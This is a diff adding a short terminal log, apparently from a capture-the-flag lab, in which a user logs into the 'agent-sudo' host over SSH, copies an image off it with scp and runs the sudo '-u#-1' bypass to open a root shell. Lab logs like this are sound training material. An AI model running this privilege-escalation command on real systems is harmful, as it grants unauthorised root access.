@@ -1,0 +1,34 @@
+└─$ ssh james@10.10.188.244
+james@10.10.188.244's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Nov 16 19:25:05 UTC 2023
+
+  System load:  0.0               Processes:           94
+  Usage of /:   39.7% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.188.244
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+
+james@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+james@agent-sudo:~$ exit
+logout
+Connection to 10.10.188.244 closed.
+
+└─$ sudo scp james@10.10.188.244:Alien_autospy.jpg ./
+james@10.10.188.244's password: 
+Alien_autospy.jpg
+
+james@agent-sudo:~$ sudo -u#-1 /bin/bash 
+
